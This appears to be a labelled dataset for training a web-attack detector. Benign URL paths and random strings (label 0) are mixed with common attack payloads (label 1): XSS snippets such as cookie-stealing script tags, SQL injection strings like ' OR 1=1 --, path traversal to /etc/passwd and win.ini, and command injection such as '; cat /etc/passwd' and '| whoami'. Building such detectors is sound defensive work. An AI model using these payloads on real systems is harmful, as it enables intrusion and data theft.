contact,0
/checkout?id=1903,0
<script>var a=698;alert(a)</script>,1
<script>var a=33;alert(a)</script>,1
login,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
onerror=alert(1),1
; cat /etc/passwd,1
/about?id=4227,0
/cart?id=6463,0
vBTcpKsNF5dj,0
KmALaqEpYIIkS6,0
1' o r '1'='1,1
0jKfmWnNKr33ng3,0
index,0
W5nga33UCIqC9om,0
admin'/* bypass */OR 1=1,1
rr2R57x5DyLF,0
../../../../etc/passwd,1
dashboard,0
../../../../etc/passwd,1
/checkout?id=3549,0
1' o r '1'='1,1
' OR 2=7 --,1
checkout,0
g9pwKHwo1n,0
prDCnoK0eJU6,0
<script>var a=99;alert(a)</script>,1
<script>var a=62;alert(a)</script>,1
admin' --,1
' OR 3=4 --,1
' OR 6=1 --,1
/blog?session=61036,0
/settings?id=5834,0
login,0
login,0
5rbgfVJWY2Y,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?session=85033,0
/login?session=60907,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?id=7837,0
/login?id=7785,0
javascript:alert(1),1
Bjl7bKSK0myE,0
; cat /etc/passwd,1
AC57lmmg5qW,0
onerror=alert(1),1
/register?id=4612,0
/search?session=28909,0
' OR 5=7 --,1
blog,0
s E l E c T * f R o M a d m i n,1
/blog?id=2193,0
checkout,0
' OR 2=9 --,1
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=4 --,1
/register?session=27600,0
<script>var a=321;alert(a)</script>,1
/settings?session=27004,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=572;alert(a)</script>,1
' OR 1=1 --,1
checkout,0
' OR 6=4 --,1
settings,0
admin%00' OR 1=1,1
/register?id=4496,0
../../../../etc/passwd,1
blog,0
about,0
admin' --,1
/search?id=541,0
/register?session=86597,0
/dashboard?id=3144,0
/about?session=51732,0
/dashboard?id=6642,0
' OR 1=1 --,1
; cat /etc/passwd,1
<script>var a=453;alert(a)</script>,1
' OR 3=4 --,1
admin' --,1
/blog?session=31213,0
uI6sCSnPk,0
; cat /etc/passwd,1
' OR 9=3 --,1
| whoami,1
| whoami,1
/home?id=8791,0
admin'/* bypass */OR 1=1,1
/search?session=56507,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?session=69738,0
fSLd0oIRrmOIGm9,0
../../../../etc/passwd,1
W6fh37ZPoaTWx0F,0
/login?id=1521,0
| whoami,1
onerror=alert(1),1
../../../windows/win.ini,1
' OR 9=2 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=26256,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
' OR '1'='1,1
LAVNJW0iRnXfNNd,0
' OR 1=5 --,1
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
<script>var a=854;alert(a)</script>,1
<script>var a=377;alert(a)</script>,1
; cat /etc/passwd,1
/checkout?session=25873,0
onerror=alert(1),1
/about?session=14419,0
/login?session=50520,0
/dashboard?id=2624,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=389;alert(a)</script>,1
/settings?id=2323,0
/user?session=48407,0
javascript:alert(1),1
index,0
profile,0
/about?id=2350,0
bTUv5rX2iV4,0
' OR 8=8 --,1
MNEsBuVfN4,0
home,0
/about?id=3169,0
admin' --,1
' OR 1=3 --,1
' OR 2=8 --,1
1' o r '1'='1,1
' OR 4=9 --,1
3UgEVyOG9c7wg,0
' OR '1'='1,1
/checkout?session=40835,0
../../../windows/win.ini,1
<script>alert(document.cookie)</script>,1
settings,0
settings,0
/checkout?id=9385,0
user,0
KRGQFiuR6eihSE,0
/checkout?id=9997,0
' OR 1=1 --,1
/register?session=45748,0
admin%00' OR 1=1,1
' OR 1=1 --,1
/blog?session=22227,0
/search?session=21885,0
/settings?id=2247,0
/index?id=4166,0
<script>var a=301;alert(a)</script>,1
javascript:alert(1),1
/login?session=51461,0
<script>var a=624;alert(a)</script>,1
admin%00' OR 1=1,1
../../../../etc/passwd,1
admin' --,1
about,0
/cart?session=35897,0
cXV1yam7,0
/search?session=86370,0
' OR 1=1 --,1
onerror=alert(1),1
/cart?session=75268,0
blog,0
' OR 8=7 --,1
/checkout?id=5994,0
<script>var a=88;alert(a)</script>,1
/dashboard?id=7813,0
' OR 1=1 --,1
' OR 4=5 --,1
' OR 3=4 --,1
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
/user?id=4718,0
/cart?session=76934,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?session=37464,0
' OR 6=8 --,1
home,0
j8ZcKV8U9DmAc,0
javascript:alert(1),1
/user?session=87175,0
/index?session=77166,0
' OR 6=4 --,1
<script>var a=471;alert(a)</script>,1
admin' --,1
home,0
' OR 9=8 --,1
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
' OR 6=1 --,1
s E l E c T * f R o M a d m i n,1
user,0
43mH4Nejm,0
admin%00' OR 1=1,1
/profile?session=86379,0
/profile?id=6894,0
' OR 1=8 --,1
/dashboard?session=60579,0
<script>var a=637;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>var a=756;alert(a)</script>,1
W8QYTtRw6HS4Kbb,0
t7HRYOdHaqLa7,0
<script>var a=893;alert(a)</script>,1
home,0
Kgdq6yLw4xe8s,0
/home?id=6422,0
/checkout?id=2855,0
/login?session=24614,0
onerror=alert(1),1
settings,0
2pvgCfQBNsZ0,0
gqjBy2wV0RcMD,0
<script>var a=404;alert(a)</script>,1
1' o r '1'='1,1
/blog?session=84092,0
/profile?session=83137,0
' OR 1=1 --,1
/settings?id=1091,0
Fw3D1cjYOgo28,0
../../../../etc/passwd,1
vFPWvdENFRA,0
' OR 6=8 --,1
index,0
' OR '1'='1,1
' OR 7=6 --,1
/contact?id=1102,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
sffojhqGFwWe,0
' OR 9=8 --,1
javascript:alert(1),1
/dashboard?id=5960,0
/user?session=36657,0
/search?id=2877,0
' OR 1=1 --,1
/dashboard?session=96410,0
profile,0
d9mMkuyY,0
' OR '1'='1,1
../../../windows/win.ini,1
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
register,0
admin' --,1
' OR 1=1 --,1
../../../../etc/passwd,1
' OR 6=3 --,1
; cat /etc/passwd,1
' OR 6=1 --,1
/register?id=1045,0
<script>var a=620;alert(a)</script>,1
/register?session=94612,0
admin' --,1
hjTfrL4BTdzh,0
tkXYIUSa2Twb6,0
/search?id=9713,0
<script>var a=628;alert(a)</script>,1
Aej0MABztelQ8,0
/register?session=76788,0
R8uMbtFH,0
index,0
caD9WHTRS9P,0
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
blog,0
/cart?session=11642,0
/settings?id=9281,0
home,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
xWiTQko2b,0
home,0
/about?id=3593,0
<script>var a=561;alert(a)</script>,1
/search?id=1429,0
/profile?id=6910,0
/about?session=71914,0
7Nk0Lb55,0
/profile?id=7469,0
<script>var a=230;alert(a)</script>,1
' OR 4=7 --,1
/login?session=16003,0
home,0
' OR 7=7 --,1
dashboard,0
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
user,0
' OR 8=2 --,1
settings,0
about,0
' OR 1=1 --,1
cart,0
/user?id=5414,0
home,0
/index?id=9821,0
index,0
| whoami,1
<script>var a=501;alert(a)</script>,1
/user?id=2657,0
/user?session=63162,0
' OR 1=1 --,1
admin%00' OR 1=1,1
blog,0
/login?session=78352,0
D7yrDAxPM,0
contact,0
../../../windows/win.ini,1
/dashboard?session=84046,0
dashboard,0
contact,0
<script>alert(document.cookie)</script>,1
' OR 1=5 --,1
<script>var a=117;alert(a)</script>,1
<script>var a=507;alert(a)</script>,1
<script>var a=740;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=526;alert(a)</script>,1
about,0
admin%00' OR 1=1,1
WWHdx99GR2Y,0
/settings?session=27024,0
<script>var a=616;alert(a)</script>,1
contact,0
/about?id=7268,0
/settings?id=1938,0
' OR 7=8 --,1
/search?session=46807,0
/checkout?session=36862,0
../../../../etc/passwd,1
' OR 1=2 --,1
dashboard,0
admin%00' OR 1=1,1
AsQvRqp6vl4Q,0
<script>var a=657;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=198;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
1' o r '1'='1,1
/home?id=6762,0
/search?session=37780,0
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
s E l E c T * f R o M a d m i n,1
<script>var a=973;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
| whoami,1
; cat /etc/passwd,1
/blog?id=8373,0
onerror=alert(1),1
<script>var a=493;alert(a)</script>,1
mKjtmxBE,0
javascript:alert(1),1
; cat /etc/passwd,1
<script>var a=355;alert(a)</script>,1
| whoami,1
/checkout?session=93488,0
dashboard,0
<script>var a=439;alert(a)</script>,1
<script>var a=374;alert(a)</script>,1
/user?id=8593,0
<script>var a=281;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
; cat /etc/passwd,1
blog,0
PmsoOYDPd6tQ,0
s E l E c T * f R o M a d m i n,1
<script>var a=837;alert(a)</script>,1
DZVqTlDOSD,0
/contact?session=71191,0
onerror=alert(1),1
5PAPaED72ui,0
tZMus07oDeW,0
/user?session=58169,0
/home?id=9093,0
' OR 4=9 --,1
<script>var a=501;alert(a)</script>,1
../../../../etc/passwd,1
' OR 1=1 --,1
/checkout?id=417,0
/blog?id=3446,0
' OR 5=4 --,1
/about?session=12221,0
/home?id=6703,0
<script>var a=283;alert(a)</script>,1
/home?session=34584,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
login,0
/cart?id=2924,0
onerror=alert(1),1
' OR 7=7 --,1
cLgbL4EApK5Zayz,0
settings,0
<script>alert(document.cookie)</script>,1
login,0
/index?session=15940,0
| whoami,1
<script>alert(document.cookie)</script>,1
' OR '1'='1,1
/contact?id=56,0
' OR 1=1 --,1
admin'/* bypass */OR 1=1,1
/register?id=6307,0
K7gno09b,0
/dashboard?id=6281,0
/checkout?id=8379,0
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
profile,0
/checkout?session=75228,0
search,0
onerror=alert(1),1
/dashboard?session=93725,0
' OR 7=7 --,1
/blog?id=3424,0
<script>var a=74;alert(a)</script>,1
/index?id=7280,0
/settings?id=3669,0
<script>var a=918;alert(a)</script>,1
<script>var a=344;alert(a)</script>,1
BPN6tdj231kj,0
../../../../etc/passwd,1
/register?id=1792,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?id=3199,0
/settings?id=1673,0
/register?id=7871,0
/contact?session=75964,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
AH1vrht3isk7,0
/about?session=52298,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
/search?session=23543,0
' OR 1=8 --,1
../../../windows/win.ini,1
/search?session=18574,0
Y6EVbLOJ4Kcc,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin%00' OR 1=1,1
I14v5pmf3eyjAg,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?id=3139,0
../../../windows/win.ini,1
<script>var a=542;alert(a)</script>,1
; cat /etc/passwd,1
/blog?id=4320,0
/home?session=20742,0
../../../windows/win.ini,1
Ot0qGNXvTZky,0
F1IthxfU88ip6,0
ffqY2jxlj91,0
<script>alert(document.cookie)</script>,1
HcTy0LA9XWcQwfC,0
<script>var a=567;alert(a)</script>,1
about,0
' OR 1=6 --,1
/contact?id=1447,0
fYGliNDcNBAy,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?id=7138,0
' OR 9=6 --,1
register,0
<script>var a=237;alert(a)</script>,1
/home?session=84686,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
/profile?session=45381,0
2efYnmNEDBXnl,0
JVUrrtV39RTgRe,0
<script>var a=414;alert(a)</script>,1
' OR 2=6 --,1
admin%00' OR 1=1,1
' OR 1=1 --,1
index,0
| whoami,1
TA8YyIlmk,0
/dashboard?id=8312,0
1' o r '1'='1,1
/login?id=1191,0
1' o r '1'='1,1
/checkout?id=6625,0
/home?session=24214,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
<script>var a=337;alert(a)</script>,1
| whoami,1
../../../../etc/passwd,1
/home?session=78728,0
cZabmgPT7,0
/profile?id=4704,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
9zNxQ9DPO1Ln,0
home,0
/user?id=3995,0
/contact?session=12619,0
/profile?id=1732,0
; cat /etc/passwd,1
/login?session=19708,0
settings,0
index,0
9lLFR1jSHx,0
1' o r '1'='1,1
/login?session=31677,0
/index?id=4335,0
<script>var a=186;alert(a)</script>,1
| whoami,1
mFbeGY1iT,0
' OR 7=6 --,1
/home?id=9926,0
<script>var a=442;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=923;alert(a)</script>,1
javascript:alert(1),1
../../../windows/win.ini,1
' OR '1'='1,1
/settings?session=72400,0
qgSSPRM71wDOT5W,0
' OR '1'='1,1
| whoami,1
iwuLBOes07KP,0
contact,0
<script>var a=832;alert(a)</script>,1
blog,0
' OR 6=3 --,1
admin%00' OR 1=1,1
' OR 4=9 --,1
/index?id=4706,0
' OR 2=7 --,1
<script>var a=867;alert(a)</script>,1
' OR '1'='1,1
; cat /etc/passwd,1
8x9xvQcaNJK,0
/index?session=61785,0
<script>var a=267;alert(a)</script>,1
' OR 9=3 --,1
gRwvnFmW5R,0
../../../../etc/passwd,1
' OR 7=5 --,1
settings,0
<script>var a=745;alert(a)</script>,1
checkout,0
onerror=alert(1),1
' OR 1=3 --,1
/index?id=6156,0
admin'/* bypass */OR 1=1,1
/cart?id=9197,0
/cart?id=9487,0
admin%00' OR 1=1,1
/register?session=53092,0
s E l E c T * f R o M a d m i n,1
JiIWtVd4dlf,0
/home?session=71683,0
<script>var a=640;alert(a)</script>,1
' OR 3=3 --,1
jtwzlPOf40T,0
<script>var a=958;alert(a)</script>,1
/user?id=9895,0
/about?id=6426,0
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
/register?id=6595,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?id=8416,0
' OR 5=5 --,1
login,0
1' o r '1'='1,1
2FzLTd8BSx,0
' OR 7=7 --,1
admin' --,1
/home?id=5535,0
<script>var a=104;alert(a)</script>,1
login,0
<script>var a=219;alert(a)</script>,1
<script>var a=56;alert(a)</script>,1
<script>var a=384;alert(a)</script>,1
<script>var a=755;alert(a)</script>,1
; cat /etc/passwd,1
admin' --,1
/search?id=8082,0
<script>var a=872;alert(a)</script>,1
/contact?id=2702,0
/contact?id=9032,0
wS33SbsND5u6WO4,0
| whoami,1
SJeTzyrq6,0
/user?id=7716,0
' OR 1=5 --,1
/blog?id=6821,0
index,0
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
user,0
<script>var a=370;alert(a)</script>,1
settings,0
/about?id=6664,0
home,0
/dashboard?id=8431,0
s E l E c T * f R o M a d m i n,1
<script>var a=885;alert(a)</script>,1
' OR 7=7 --,1
/login?id=8778,0
/profile?session=84821,0
/checkout?session=57979,0
3Vk04qlQNMKrYEL,0
<script>var a=256;alert(a)</script>,1
1' o r '1'='1,1
admin' --,1
wR4vBA68V2,0
' OR 6=9 --,1
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
/search?id=9318,0
/login?id=6590,0
/search?id=3085,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
DmCAG6Ba,0
fbjghzLdMN7u1w,0
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
/register?session=23308,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?session=54309,0
/settings?id=898,0
2MTt7rIA,0
/contact?id=8507,0
settings,0
<script>alert(document.cookie)</script>,1
cart,0
jdk0gimpVzf3,0
Z3h3A4BYEojnGu,0
profile,0
<script>alert(document.cookie)</script>,1
| whoami,1
/register?id=3813,0
register,0
/search?id=1455,0
shKqtRnz3a,0
1' o r '1'='1,1
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
CiR0jgmtTL4Q,0
| whoami,1
nRqht9xz0NvgZ,0
' OR 6=8 --,1
index,0
blog,0
<script>var a=274;alert(a)</script>,1
' OR 9=8 --,1
/user?session=97252,0
/about?id=1992,0
dashboard,0
cart,0
qs86o6lAH,0
onerror=alert(1),1
' OR 1=1 --,1
profile,0
uk6104Fsm7aiUvL,0
about,0
/index?session=33522,0
onerror=alert(1),1
/blog?id=4355,0
checkout,0
search,0
blog,0
cXtN1cx1Ux2N1,0
settings,0
V43J6AdvkxxKr,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=91695,0
profile,0
<script>var a=683;alert(a)</script>,1
javascript:alert(1),1
' OR 3=5 --,1
; cat /etc/passwd,1
about,0
/settings?session=58808,0
admin'/* bypass */OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?id=2934,0
' OR 1=4 --,1
admin'/* bypass */OR 1=1,1
/blog?session=55145,0
contact,0
' OR '1'='1,1
<script>var a=929;alert(a)</script>,1
; cat /etc/passwd,1
login,0
' OR '1'='1,1
/index?id=3303,0
<script>var a=340;alert(a)</script>,1
/index?id=486,0
' OR 1=5 --,1
' OR 9=5 --,1
/dashboard?session=42698,0
onerror=alert(1),1
zlW0tpOJ,0
/contact?id=5645,0
svofDxkc,0
javascript:alert(1),1
1' o r '1'='1,1
../../../windows/win.ini,1
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
<script>alert(document.cookie)</script>,1
/settings?id=4760,0
' OR 1=3 --,1
user,0
/dashboard?session=58158,0
' OR 1=8 --,1
/profile?id=5228,0
admin%00' OR 1=1,1
' OR 2=9 --,1
3iINtgB2bO,0
' OR 9=4 --,1
' OR 3=2 --,1
' OR 6=2 --,1
| whoami,1
admin%00' OR 1=1,1
/about?session=31706,0
contact,0
<script>alert(document.cookie)</script>,1
/home?id=7957,0
vkyBhp6rD4A,0
/search?id=6493,0
home,0
/register?id=4189,0
1' o r '1'='1,1
' OR 3=6 --,1
' OR 4=2 --,1
admin%00' OR 1=1,1
| whoami,1
blog,0
' OR '1'='1,1
/register?id=8778,0
' OR 1=1 --,1
login,0
<script>var a=98;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
profile,0
<script>var a=857;alert(a)</script>,1
| whoami,1
qLOJcnPrsmdMKWX,0
HiD8QWEGQnX69,0
<script>var a=760;alert(a)</script>,1
../../../../etc/passwd,1
/cart?id=5751,0
' OR '1'='1,1
/profile?id=8629,0
/about?session=25265,0
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
/index?session=45061,0
blog,0
checkout,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
pi6GOVlWh,0
onerror=alert(1),1
<script>var a=460;alert(a)</script>,1
cM0kobONlo01y,0
contact,0
/about?id=5608,0
../../../windows/win.ini,1
/contact?session=90212,0
<script>alert(document.cookie)</script>,1
| whoami,1
<script>var a=46;alert(a)</script>,1
/about?id=554,0
admin' --,1
' OR 1=1 --,1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?session=79260,0
<script>var a=498;alert(a)</script>,1
/search?id=6479,0
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
qTPABhq7hK,0
0rq1M5O6QPwn,0
/user?session=82941,0
<script>var a=96;alert(a)</script>,1
index,0
/register?session=69058,0
/index?id=9002,0
/home?session=21862,0
../../../../etc/passwd,1
2HNywp3IAZ2gXN,0
/blog?session=10020,0
eoNE6grKF9X,0
qCNpq6WW2Iin,0
/search?id=1388,0
admin%00' OR 1=1,1
admin%00' OR 1=1,1
/home?id=2319,0
/home?id=5732,0
/user?session=90573,0
/dashboard?id=4161,0
/settings?session=89690,0
/index?session=75124,0
/contact?id=2596,0
' OR 6=3 --,1
/blog?id=9197,0
/register?id=8545,0
<script>var a=369;alert(a)</script>,1
1' o r '1'='1,1
' OR 7=8 --,1
/login?id=3613,0
/index?session=85535,0
/dashboard?session=32174,0
8l5wMDGWAm,0
' OR 8=7 --,1
/login?session=29673,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 9=6 --,1
1' o r '1'='1,1
/contact?session=94855,0
onerror=alert(1),1
1ue8iuBU0OVmT,0
| whoami,1
javascript:alert(1),1
<script>var a=384;alert(a)</script>,1
<script>var a=925;alert(a)</script>,1
admin' --,1
<script>var a=986;alert(a)</script>,1
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
947CBHRxps,0
cCsRDX2HvtQ6,0
/dashboard?id=3020,0
' OR 2=9 --,1
yELOls0B6eSS,0
/profile?session=28555,0
Y7JymW86S5YIc,0
/register?id=9650,0
/home?id=384,0
PXq4kJsX1J,0
<script>alert(document.cookie)</script>,1
/register?session=83292,0
1' o r '1'='1,1
/register?session=40750,0
' OR 7=7 --,1
javascript:alert(1),1
../../../../etc/passwd,1
settings,0
1CjCBkC6defPTCH,0
BkJi1N0ctYa,0
/user?id=1225,0
<script>var a=298;alert(a)</script>,1
| whoami,1
<script>alert(document.cookie)</script>,1
/checkout?id=6649,0
index,0
onerror=alert(1),1
javascript:alert(1),1
admin%00' OR 1=1,1
blog,0
/dashboard?session=37679,0
/about?session=41416,0
<script>var a=193;alert(a)</script>,1
../../../../etc/passwd,1
<script>var a=499;alert(a)</script>,1
<script>var a=725;alert(a)</script>,1
/profile?id=4489,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
dashboard,0
uoVQyf5C6hlfZd9,0
<script>var a=938;alert(a)</script>,1
' OR 1=1 --,1
cart,0
/search?id=5822,0
profile,0
UpvQsyVQ9ocu,0
' OR 8=8 --,1
' OR 3=6 --,1
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
dashboard,0
/register?id=5499,0
bYvnClKUC,0
829Umgo8hUmqx,0
jDkIwFE4,0
/about?session=21445,0
index,0
EeTRjxqk,0
<script>var a=37;alert(a)</script>,1
/dashboard?session=93900,0
LV0Dv99Aa,0
/about?session=64829,0
/register?session=88347,0
<script>alert(document.cookie)</script>,1
/index?session=47246,0
' OR 1=1 --,1
/home?id=6918,0
/profile?session=22020,0
../../../windows/win.ini,1
/user?session=92281,0
S78E5svy,0
' OR 5=1 --,1
/index?id=802,0
../../../windows/win.ini,1
| whoami,1
1Dmrr78U,0
blog,0
/settings?id=4300,0
s E l E c T * f R o M a d m i n,1
' OR 7=9 --,1
s E l E c T * f R o M a d m i n,1
register,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
/cart?session=21915,0
/blog?id=1898,0
s E l E c T * f R o M a d m i n,1
gjsRHrn1aTn,0
/dashboard?id=8142,0
<script>var a=608;alert(a)</script>,1
' OR 8=8 --,1
/blog?id=8416,0
<script>var a=361;alert(a)</script>,1
../../../windows/win.ini,1
; cat /etc/passwd,1
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
' OR 3=5 --,1
admin%00' OR 1=1,1
qE6Yi6wSp9,0
/index?session=12472,0
/register?session=45670,0
/dashboard?id=2847,0
2uG3yYKu3J,0
/blog?session=84455,0
blog,0
/dashboard?id=9419,0
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=65584,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
cart,0
' OR 8=6 --,1
POEcyWdotpN89,0
<script>var a=729;alert(a)</script>,1
' OR 2=3 --,1
<script>var a=500;alert(a)</script>,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
s E l E c T * f R o M a d m i n,1
<script>var a=725;alert(a)</script>,1
' OR 1=1 --,1
search,0
about,0
javascript:alert(1),1
onerror=alert(1),1
settings,0
' OR 3=9 --,1
X2qfs9E5DN1,0
<script>var a=268;alert(a)</script>,1
/blog?session=53633,0
' OR 3=9 --,1
' OR 7=9 --,1
AkeX45p7R29U,0
register,0
<script>var a=793;alert(a)</script>,1
admin%00' OR 1=1,1
/register?session=47071,0
/about?id=9648,0
' OR '1'='1,1
<script>var a=432;alert(a)</script>,1
<script>var a=751;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 5=6 --,1
; cat /etc/passwd,1
admin%00' OR 1=1,1
/blog?id=5460,0
/settings?session=40884,0
/search?session=19333,0
oUZqv24M,0
<script>var a=423;alert(a)</script>,1
' OR '1'='1,1
mXhUVyaQIusoSY,0
1' o r '1'='1,1
' OR 1=1 --,1
' OR 9=9 --,1
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/register?session=17846,0
/settings?session=81916,0
/user?session=16214,0
/settings?session=54960,0
RQpH2WfGmx,0
admin'/* bypass */OR 1=1,1
contact,0
4V3gfSWEQ42nz5,0
<script>var a=946;alert(a)</script>,1
; cat /etc/passwd,1
/cart?session=56758,0
onerror=alert(1),1
contact,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=5 --,1
<script>var a=864;alert(a)</script>,1
/contact?id=4116,0
admin%00' OR 1=1,1
<script>var a=213;alert(a)</script>,1
blog,0
UUOVuiFA,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
13KRhpLA5sh6,0
contact,0
/login?id=4340,0
16eMOgOgHJs,0
/index?session=25874,0
/home?id=5739,0
profile,0
<script>var a=20;alert(a)</script>,1
WRss1PJg1M99mt,0
/about?session=15572,0
e9Rz2hcsI,0
' OR 1=1 --,1
JC6hYiLGFy9tuf,0
eaYTbfT7uwYrec,0
register,0
' OR 5=4 --,1
../../../windows/win.ini,1
checkout,0
1' o r '1'='1,1
admin%00' OR 1=1,1
1' o r '1'='1,1
JQtzdG3hkelZPsP,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
settings,0
/blog?id=3358,0
/user?session=95066,0
eG5cJvFE,0
search,0
' OR 4=4 --,1
' OR 9=8 --,1
about,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?session=99458,0
qUaYTZi0,0
user,0
' OR 6=1 --,1
/blog?session=75144,0
<script>var a=917;alert(a)</script>,1
' OR 6=1 --,1
WxriGiNbSN77Qx,0
W4n4dd2Sq3A22op,0
ClahCpSWM,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
DPwypikSjW,0
' OR 9=4 --,1
<script>var a=163;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
<script>var a=989;alert(a)</script>,1
dashboard,0
93syHcQNhoYzRMa,0
about,0
admin' --,1
/settings?session=60732,0
jMuRU1xR0tfg2P,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
5AHK3zi7J8E,0
' OR 7=6 --,1
<script>alert(document.cookie)</script>,1
/settings?session=78904,0
/index?id=7035,0
' OR 1=1 --,1
checkout,0
1' o r '1'='1,1
| whoami,1
/register?id=3019,0
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=4 --,1
<script>var a=428;alert(a)</script>,1
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
/cart?id=6878,0
/contact?session=50081,0
7Rng7BFiVjLS,0
/search?id=4661,0
| whoami,1
gQMs7wbIs1,0
cart,0
' OR 3=3 --,1
index,0
' OR '1'='1,1
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
/about?session=43262,0
<script>var a=416;alert(a)</script>,1
<script>var a=544;alert(a)</script>,1
/cart?session=34791,0
onerror=alert(1),1
/contact?session=15255,0
huRem10eIPjnJPs,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
home,0
/register?session=13142,0
<script>alert(document.cookie)</script>,1
/checkout?id=1959,0
' OR 5=1 --,1
/dashboard?id=6779,0
index,0
GeEOPexujvJ4i,0
/settings?id=4779,0
dashboard,0
<script>alert(document.cookie)</script>,1
<script>var a=805;alert(a)</script>,1
admin%00' OR 1=1,1
/cart?session=54549,0
/home?session=82632,0
/profile?id=3336,0
onerror=alert(1),1
/home?id=3720,0
; cat /etc/passwd,1
settings,0
/checkout?id=2184,0
<script>var a=33;alert(a)</script>,1
wVxhLklrUwny,0
' OR '1'='1,1
/search?session=98892,0
' OR 1=1 --,1
| whoami,1
/register?session=80597,0
' OR 8=5 --,1
zQTDgVN8be9pI,0
' OR 1=1 --,1
Qqc2x90s,0
checkout,0
/about?id=2098,0
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
38wrwDiHJQnQ6C,0
javascript:alert(1),1
/register?id=466,0
/checkout?session=40615,0
/search?id=6277,0
../../../../etc/passwd,1
/blog?session=38008,0
/home?id=4292,0
admin'/* bypass */OR 1=1,1
MBQeYnUY9aO,0
' OR '1'='1,1
<script>var a=820;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
MN8USjAhAt,0
<script>var a=801;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
